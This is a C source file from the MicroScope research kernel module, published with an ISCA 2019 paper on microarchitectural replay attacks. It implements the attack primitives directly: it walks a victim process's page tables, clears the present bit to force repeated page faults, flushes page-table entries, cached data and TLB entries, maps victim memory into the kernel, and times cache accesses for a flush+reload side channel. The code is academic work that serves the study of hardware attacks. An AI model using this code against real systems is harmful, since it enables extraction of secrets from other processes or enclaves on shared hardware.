/*
 * Author: Dimitrios Skarlatos
 * Contact: skarlat2@illinois.edu - http://skarlat2.web.engr.illinois.edu/
 *
 * The microscope_mod is a kernel module that can be used to perform microarchitectural
 * replay attacks using page faults.
 *
 * More details in :
 * MicroScope: Enabling Microarchitectural Replay Attacks.
 * Dimitrios Skarlatos, Mengjia Yan, Bhargava Gopireddy, Read Sprabery, Josep Torrellas,
 * and Christopher W. Fletcher. Proceedings of the 46th Intl. Symposium on Computer
 * Architecture (ISCA), Phoenix, USA, June 2019.
 *
 * util.c contains the implementation of all the required utility functions
 * to perform the replay attack. Description of functions are in util.h
 * The functions include:
 * 1) tracking page tables of a requested virtual address
 * 2) perform the nuke which completly flushes all
 * the page table entries and data from the caches for a specified address.
 * 3) create kernel level mapping to process level memory
 * 4) perform a flush+reload side channel
 * 5) other utility functions used for attacks
 */

#include <asm/apic.h>
#include <asm/cache.h>
#include <asm/cacheflush.h>
#include <asm/io.h>
#include <asm/mmu_context.h>
#include <asm/pgalloc.h>
#include <asm/pgtable.h>
#include <asm/tlb.h>
#include <asm/tlbflush.h>
#include <asm/uaccess.h>
#include <asm/uv/uv.h>
#include <linux/device.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/hrtimer.h>
#include <linux/hugetlb.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/ktime.h>
#include <linux/memcontrol.h>
#include <linux/mm.h>
#include <linux/mman.h>
#include <linux/mmu_notifier.h>
#include <linux/module.h>
#include <linux/pagemap.h>
#include <linux/pid.h>
#include <linux/rmap.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/swap.h>
#include <linux/swapops.h>
#include <linux/syscalls.h>
#include <linux/timer.h>

MODULE_LICENSE("GPL v2");

#include "util.h"

void asm_clflush(uint64_t addr) { asm volatile("clflush (%0)" ::"r"(addr)); }

uint32_t asm_cctime(uint64_t addr) {
  uint32_t cycles;

  asm volatile(
      "mov %1, %%r8\n\t"
      "lfence\n\t"
      "rdtsc\n\t"
      "mov %%eax, %%edi\n\t"
      "mov (%%r8), %%r8\n\t"
      "lfence\n\t"
      "rdtsc\n\t"
      "sub %%edi, %%eax\n\t"
      : "=a"(cycles) /*output*/
      : "r"(addr)
      : "r8", "edi");

  return cycles;
}

void setup_nuke_structs(struct attack_info *info, uint64_t address) {
  int ret = 0;
  spinlock_t *ptlp;
  pte_t *ptep;
  uint64_t paddr;

  info->nuke_addr = address;
  info->nuke_tsk = current;
  info->nuke_pid = current->pid;
  info->nuke_mm = current->mm;

  ret = map_general_address(info->nuke_tsk, info->nuke_mm, info->nuke_addr, 0,
                            &(info->nuke_kaddr));
  if (ret <= 0 || (uint64_t)info->nuke_kaddr == 0) {
    printk(KERN_INFO "setup_nuke_structs: Mapping nuke address failed\n");
    info->error = 1;
    return;
  }
#ifdef DEBUG
  printk(KERN_INFO "setup_nuke_structs: Mapped nuke_addr %p -> nuke_kaddr %p\n",
         (uint64_t *)info->nuke_addr, info->nuke_kaddr);
#endif

  map_pgt_4level_lock(info, &ptlp);
  pte_unmap_unlock(info->nuke_ptep, ptlp);

  paddr = get_physical(info->nuke_mm, address, &ptep, &ptlp, 1);
  printk(KERN_INFO "Physical address of nuke %p -> %p\n", (uint64_t *)info->nuke_addr,
         (uint64_t *)paddr);
}

void setup_monitor_structs(struct attack_info *info, uint64_t address, uint32_t index) {
  int ret = 0;
  spinlock_t *ptlp;
  pte_t *ptep;
  uint64_t paddr;

  info->monitor_addr[index] = address;
  info->monitor_addr_start[index] = address;

  ret = map_general_address(info->nuke_tsk, info->nuke_mm, info->monitor_addr[index], 0,
                            &(info->monitor_kaddr[index]));
  if (ret <= 0 || (uint64_t)info->monitor_kaddr[index] == 0) {
    printk(KERN_INFO "setup_monitor_structs: Mapping monitor address failed\n");
    info->error = 1;
    return;
  }

#ifdef DEBUG
  printk(KERN_INFO "setup_monitor_structs: Mapped monitor_addr %p -> monitor_kaddr %p\n",
         (uint64_t *)info->monitor_addr[index], info->monitor_kaddr[index]);
#endif

  paddr = get_physical(info->nuke_mm, address, &ptep, &ptlp, 1);
  printk(KERN_INFO "Physical address of monitor %p -> %p\n",
         (uint64_t *)info->monitor_addr[index], (uint64_t *)paddr);

  info->monitors++;

#ifdef DEBUG
  print_info(info);
#endif
}

void pf_prep(struct attack_info *info, uint64_t address, uint32_t tot_monitor) {
  int ret = 0, i = 0;
  uint64_t old_time = 0, wait_time = 0;
  pte_t *ptep;
  spinlock_t *ptl;

  if (info->nuke_ptep) {
    // notify the page fault handler that this is the replay handle pte
    set_attack(info->nuke_ptep, 1);
  } else {
    printk(KERN_INFO "pf_prep: Nuke pte is not mapped, aborting\n");
    return;
  }

  // perform a nuke on the address and prepare a minor page fault
  ret = nuke_lock(info->nuke_mm, address, &ptep, &ptl, 1);
  if (ret) {
    info->error = 1;
    return;
  }
  // for (i = 0; i < tot_monitor; i++) {
  // printk(KERN_INFO "Nuke_mod: Starting probing at address %p\n",
  //       (uint64_t *)info->monitor_addr[i]);
  // flush the monitoring address
  // use the application native VA
  // clflush((uint64_t *)info->monitor_addr[i]);
  // use our own kernel mapping
  // clflush((uint64_t *)info->monitor_kaddr[0]);
  //}

  // wait some time for changes to take effect in caches and tlb
  while (wait_time < 10000) {
    old_time = rdtsc();
    wait_time += rdtsc() - old_time;
  }
}

void pf_prep_no_monitor_flush(struct attack_info *info, uint64_t address) {
  int ret = 0;
  uint64_t old_time = 0, wait_time = 0;
  pte_t *ptep;
  spinlock_t *ptl;

  if (info->nuke_ptep) {
    // notify the page fault handler that this is the replay handle pte
    set_attack(info->nuke_ptep, 1);
  } else {
    printk(KERN_INFO "pf_prep: Nuke pte is not mapped, aborting\n");
    return;
  }
  printk(KERN_INFO "pf_prep_no_monitor_flush: Preparing minor page fault\n");
  // perform a nuke on the address and prepare a minor page fault
  ret = nuke_lock(info->nuke_mm, address, &ptep, &ptl, 1);
  if (ret) {
    info->error = 1;
    return;
  }

  // wait some time for changes to take effect in caches and tlb
  while (wait_time < 10000) {
    old_time = rdtsc();
    wait_time += rdtsc() - old_time;
  }
}

void pf_prep_lockless(struct attack_info *info, uint64_t address) {
  int ret = 0;
  uint64_t old_time = 0, wait_time = 0;
  pte_t *ptep;

  if (info->nuke_ptep) {
    // notify the page fault handler that this is the replay handle pte
    set_attack(info->nuke_ptep, 1);
  } else {
    printk(KERN_INFO "pf_prep: Nuke pte is not mapped, aborting\n");
    return;
  }

  // perform a nuke on the address and prepare a minor page fault
  ret = nuke_lockless(info->nuke_mm, address, &ptep, 1);
  if (ret) {
    info->error = 1;
    return;
  }

  // wait some time for changes to take effect in caches and tlb
  while (wait_time < 10000) {
    old_time = rdtsc();
    wait_time += rdtsc() - old_time;
  }
}

void pf_redo(struct attack_info *info, uint64_t address) {
  int ret = 0, i = 0;
  uint64_t old_time = 0, wait_time = 0;
  pte_t *ptep;
  spinlock_t *ptl;

  // perform a partial nuke on the address
  ret = nuke_lockless_partial(info->nuke_mm, address, &ptep, 1);
  if (ret) {
    info->error = 1;
    printk(KERN_INFO "pf_redo: Nuke_lockless_partial error");
    return;
  }

  // wait some time for changes to take effect in caches and tlb
  while (wait_time < 10000) {
    old_time = rdtsc();
    wait_time += rdtsc() - old_time;
  }
}

int map_general_page(struct task_struct *tsk, struct mm_struct *mm, uint64_t addr,
                     int write, void **maddr) {
  struct vm_area_struct *vma;
  int ret;
  struct page *page = NULL;
  ret = get_user_pages(tsk, mm, addr, 1, write, 1, &page, &vma);
  if (ret <= 0) {
    printk("map_general_page: Error mapping page, %d\n", ret);
    return ret;
  }
  *maddr = kmap(page);
  return 1;
}

int map_general_address(struct task_struct *tsk, struct mm_struct *mm, uint64_t addr,
                        int write, void **maddr) {
  struct vm_area_struct *vma;
  int ret, offset;
  struct page *page = NULL;
  down_read(&mm->mmap_sem);
  ret = get_user_pages(tsk, mm, addr, 1, write, 1, &page, &vma);
  if (ret <= 0) {
    printk(KERN_INFO "map_general_address: Error mapping address, %d\n", ret);
    return ret;
  }
  offset = addr & (PAGE_SIZE - 1);
  *maddr = kmap(page);
  *maddr += offset;
  up_read(&mm->mmap_sem);
  return 1;
}

void user_memory_op(uint64_t addr, void *buf, int len, int write, struct page *page,
                    void *maddr, struct vm_area_struct *vma) {
  int offset;
  offset = addr & (PAGE_SIZE - 1);
  if (write) {
    copy_to_user_page(vma, page, addr, maddr + offset, buf, len);
    set_page_dirty_lock(page);
  } else {
    copy_from_user_page(vma, page, addr, buf, maddr + offset, len);
  }
}

int map_pgt_4level(struct attack_info *info) {
  info->nuke_pgd = pgd_offset(info->nuke_mm, info->nuke_addr);
  if (pgd_none(*info->nuke_pgd) || unlikely(pgd_bad(*info->nuke_pgd))) {
    printk(KERN_INFO "map_pgt_4level: pgd failed");
    goto out;
  }
  info->nuke_pud = pud_offset(info->nuke_pgd, info->nuke_addr);
  if (pud_none(*info->nuke_pud) || unlikely(pud_bad(*info->nuke_pud))) {
    printk(KERN_INFO "map_pgt_4level: pud failed");
    goto out;
  }
  info->nuke_pmd = pmd_offset(info->nuke_pud, info->nuke_addr);
  VM_BUG_ON(pmd_trans_huge(*info->nuke_pmd));
  if (pmd_none(*info->nuke_pmd) || unlikely(pmd_bad(*info->nuke_pmd))) {
    printk(KERN_INFO "map_pgt_4level: pmd failed");
    goto out;
  }
  info->nuke_ptep = pte_offset_map(info->nuke_pmd, info->nuke_addr);
  return 0;
out:
  return -EINVAL;
}

int map_pgt_4level_lock(struct attack_info *info, spinlock_t **ptlp) {
  info->nuke_pgd = pgd_offset(info->nuke_mm, info->nuke_addr);

  if (pgd_none(*info->nuke_pgd) || unlikely(pgd_bad(*info->nuke_pgd))) {
    printk(KERN_INFO "map_pgt_4level_lock: pgd failed");
    goto out;
  }

  info->nuke_pud = pud_offset(info->nuke_pgd, info->nuke_addr);

  if (pud_none(*info->nuke_pud) || unlikely(pud_bad(*info->nuke_pud))) {
    printk(KERN_INFO "map_pgt_4level_lock: pud failed");
    goto out;
  }

  info->nuke_pmd = pmd_offset(info->nuke_pud, info->nuke_addr);
  VM_BUG_ON(pmd_trans_huge(*info->nuke_pmd));
  if (pmd_none(*info->nuke_pmd) || unlikely(pmd_bad(*info->nuke_pmd))) {
    printk(KERN_INFO "map_pgt_4level_lock: pmd failed");
    goto out;
  }
  // currently ignore huge pages
  // if (pmd_huge(*info->nuke_pmd)) {
  //   printk(KERN_INFO "hugepage failed");
  //   goto out;
  // }

  info->nuke_ptep =
      pte_offset_map_lock(info->nuke_mm, info->nuke_pmd, info->nuke_addr, ptlp);
  if (!info->nuke_ptep) {
    printk(KERN_INFO "map_pgt_4level_lock: pte_offset failed");
    goto out;
  }
  if (!pte_present(*info->nuke_ptep)) {
    printk(KERN_INFO "map_pgt_4level_lock: present failed");
    goto unlock;
  }
  return 0;

unlock:
  pte_unmap_unlock(info->nuke_ptep, *ptlp);
out:
  return -EINVAL;
}

uint64_t get_physical(struct mm_struct *mm, uint64_t address, pte_t **ptepp,
                      spinlock_t **ptlp, int present) {
  pgd_t *pgd;
  pud_t *pud;
  pmd_t *pmd;
  pte_t *ptep;
  uint64_t paddr;

  pgd = pgd_offset(mm, address);
  if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd))) {
    printk(KERN_INFO "nuke_lock: pgd_offset failed");
    goto out;
  }
  pud = pud_offset(pgd, address);
  if (pud_none(*pud) || unlikely(pud_bad(*pud))) {
    printk(KERN_INFO "nuke_lock: pud_offset failed");
    goto out;
  }
  pmd = pmd_offset(pud, address);
  VM_BUG_ON(pmd_trans_huge(*pmd));
  if (pmd_none(*pmd) || unlikely(pmd_bad(*pmd))) {
    printk(KERN_INFO "nuke_lock: pmd_offset failed");
    goto out;
  }

  ptep = pte_offset_map_lock(mm, pmd, address, ptlp);

  if (!ptep) {
    printk(KERN_INFO "nuke_lock: pte_offset failed");
    goto unlock;
  }

  paddr = pte_pfn(*ptep);
  pte_unmap_unlock(ptep, *ptlp);

  return paddr;
unlock:
  pte_unmap_unlock(ptep, *ptlp);
out:
  return -EINVAL;
}

int nuke_lock(struct mm_struct *mm, uint64_t address, pte_t **ptepp, spinlock_t **ptlp,
              int present) {
  pgd_t *pgd;
  pud_t *pud;
  pmd_t *pmd;
  pte_t *ptep;

  pgd = pgd_offset(mm, address);
  if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd))) {
    printk(KERN_INFO "nuke_lock: pgd_offset failed");
    goto out;
  }
  pud = pud_offset(pgd, address);
  if (pud_none(*pud) || unlikely(pud_bad(*pud))) {
    printk(KERN_INFO "nuke_lock: pud_offset failed");
    goto out;
  }
  pmd = pmd_offset(pud, address);
  VM_BUG_ON(pmd_trans_huge(*pmd));
  if (pmd_none(*pmd) || unlikely(pmd_bad(*pmd))) {
    printk(KERN_INFO "nuke_lock: pmd_offset failed");
    goto out;
  }

  // currently ignore huge pages
  // if (pmd_huge(*pmd)) {
  //   printk(KERN_INFO "nuke_lock: huge page found, aborting..");
  //   goto out;
  // }

  ptep = pte_offset_map_lock(mm, pmd, address, ptlp);

  if (!ptep) {
    printk(KERN_INFO "nuke_lock: pte_offset failed");
    goto unlock;
  }

  if (!pte_present(*ptep)) {
    printk(KERN_INFO "nuke_lock: page is not present, aborting..");
    goto unlock;
  }

  // force a minor page fault
  if (present) {
    *ptep = pte_clear_flags(*ptep, _PAGE_PRESENT);
  }

  // flush data
  asm_clflush(address);

  // flush page tables
  clflush(ptep);
  clflush(pmd);
  clflush(pud);
  clflush(pgd);

  // flush tlb
  __flush_tlb_single(address);

  pte_unmap_unlock(ptep, *ptlp);

  return 0;
unlock:
  pte_unmap_unlock(ptep, *ptlp);
out:
  return -EINVAL;
}

int nuke_lockless(struct mm_struct *mm, uint64_t address, pte_t **ptepp, int present) {
  pgd_t *pgd;
  pud_t *pud;
  pmd_t *pmd;
  pte_t *ptep;

  pgd = pgd_offset(mm, address);
  if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd))) {
    printk(KERN_INFO "nuke_lockless: pgd_offset failed");
    goto out;
  }

  pud = pud_offset(pgd, address);
  if (pud_none(*pud) || unlikely(pud_bad(*pud))) {
    printk(KERN_INFO "nuke_lockless: pud_offset failed");
    goto out;
  }

  pmd = pmd_offset(pud, address);
  VM_BUG_ON(pmd_trans_huge(*pmd));
  if (pmd_none(*pmd) || unlikely(pmd_bad(*pmd))) {
    printk(KERN_INFO "nuke_lockless: pmd_offset failed");
    goto out;
  }

  // currently ignore huge pages
  // if (pmd_huge(*pmd)) {
  //   printk(KERN_INFO "nuke_lockless: huge page found, abort");
  //   goto out;
  // }

  ptep = pte_offset_map(pmd, address);

  if (!ptep) {
    printk(KERN_INFO "nuke_lockless: pte_offset failed");
    goto out;
  }

  if (!pte_present(*ptep)) {
    printk(KERN_INFO "nuke_lock: page is not present, aborting..");
    goto out;
  }

  // force a minor page fault
  if (present) {
    *ptep = pte_clear_flags(*ptep, _PAGE_PRESENT);
  }

  // flush data
  asm_clflush(address);

  // flush page tables
  clflush(ptep);
  clflush(pmd);
  clflush(pud);
  clflush(pgd);

  // flush tlb
  __flush_tlb_single(address);

  return 0;
out:
  return -EINVAL;
}

int nuke_lockless_partial(struct mm_struct *mm, uint64_t address, pte_t **ptepp,
                          int present) {
  pgd_t *pgd;
  pud_t *pud;
  pmd_t *pmd;
  pte_t *ptep;

  pgd = pgd_offset(mm, address);
  if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd))) {
    printk(KERN_INFO "nuke_lockless: pgd_offset failed");
    goto out;
  }

  pud = pud_offset(pgd, address);
  if (pud_none(*pud) || unlikely(pud_bad(*pud))) {
    printk(KERN_INFO "nuke_lockless: pud_offset failed");
    goto out;
  }

  pmd = pmd_offset(pud, address);
  VM_BUG_ON(pmd_trans_huge(*pmd));
  if (pmd_none(*pmd) || unlikely(pmd_bad(*pmd))) {
    printk(KERN_INFO "nuke_lockless: pmd_offset failed");
    goto out;
  }

  // currently ignore huge pages
  // if (pmd_huge(*pmd)) {
  //   printk(KERN_INFO "nuke_lockless: huge page found, abort");
  //   goto out;
  // }

  ptep = pte_offset_map(pmd, address);

  if (!ptep) {
    printk(KERN_INFO "nuke_lockless: pte_offset failed");
    goto out;
  }

  // if (!pte_present(*ptep)) {
  //   printk(KERN_INFO "nuke_lock: page is not present, aborting..");
  //   goto out;
  // }

  // force a minor page fault
  // if (present) {
  //   *ptep = pte_clear_flags(*ptep, _PAGE_PRESENT);
  // }

  // flush data
  // asm_clflush(address);

  // flush page tables
  clflush(ptep);
  clflush(pmd);
  clflush(pud);
  clflush(pgd);

  // flush tlb
  //__flush_tlb_single(address);

  return 0;
out:
  return -EINVAL;
}

uint64_t check_side_channel_single(uint64_t address, uint32_t index) {
  uint64_t access_time = 0;
  access_time = asm_cctime(address);
#ifdef DEBUG
  printk(KERN_INFO "side_channel: Page fault, %u, access time, %llu\n", index,
         access_time);
#endif
  return access_time;
}

void print_info(struct attack_info *info) {
  int i;
  if (info->nuke_tsk != NULL) {
    printk(KERN_INFO "print_info: Victim task %p\n", info->nuke_tsk);
  } else {
    printk(KERN_INFO "print_info: Victim task is NULL\n");
  }

  if (info->nuke_mm != NULL) {
    printk(KERN_INFO "print_info: Victim mm %p\n", info->nuke_mm);
  } else {
    printk(KERN_INFO "print_info: Victim mm is NULL\n");
  }

  if (info->nuke_pid != 0) {
    printk(KERN_INFO "print_info: Victim pid %d\n", info->nuke_pid);
  } else {
    printk(KERN_INFO "print_info: Victim pid is not set\n");
  }

  if (info->nuke_addr != 0) {
    printk(KERN_INFO "print_info: Victim nuke addr %p\n", (uint64_t *)info->nuke_addr);
  } else {
    printk(KERN_INFO "print_info: Victim nuke addr is not set\n");
  }

  if (info->nuke_kaddr != NULL) {
    printk(KERN_INFO "print_info: Victim nuke kaddr %p\n", info->nuke_kaddr);
  } else {
    printk(KERN_INFO "print_info: Victim nuke kaddr is not set\n");
  }

  for (i = 0; i < info->monitors; i++) {
    if (info->monitor_addr[i] != 0) {
      printk(KERN_INFO "print_info: Victim monitor addr[%d] %p\n", i,
             (uint64_t *)info->monitor_addr[i]);
    } else {
      printk(KERN_INFO "print_info: Victim monitor addr[%d] is not set\n", i);
    }

    if (info->monitor_kaddr[i] != NULL) {
      printk(KERN_INFO "print_info: Victim monitor kaddr[%d] %p\n", i,
             info->monitor_kaddr[i]);
    } else {
      printk(KERN_INFO "print_info: Victim monitor kaddr[%d] is not set\n", i);
    }
  }

  if (info->nuke_pgd != NULL) {
    printk(KERN_INFO "print_info: Victim nuke pgd %p\n", info->nuke_pgd);
  } else {
    printk(KERN_INFO "print_info: Victim nuke pgd is NULL\n");
  }

  if (info->nuke_pud != NULL) {
    printk(KERN_INFO "print_info: Victim nuke pud %p\n", info->nuke_pud);
  } else {
    printk(KERN_INFO "print_info: Victim nuke pud is NULL\n");
  }

  if (info->nuke_pmd != NULL) {
    printk(KERN_INFO "print_info: Victim nuke pmd %p\n", info->nuke_pmd);
  } else {
    printk(KERN_INFO "print_info: Victim nuke pmd is NULL\n");
  }

  if (info->nuke_ptep != NULL) {
    printk(KERN_INFO "print_info: Victim nuke pte %p\n", info->nuke_ptep);
  } else {
    printk(KERN_INFO "print_info: Victim nuke pte is NULL\n");
  }
}
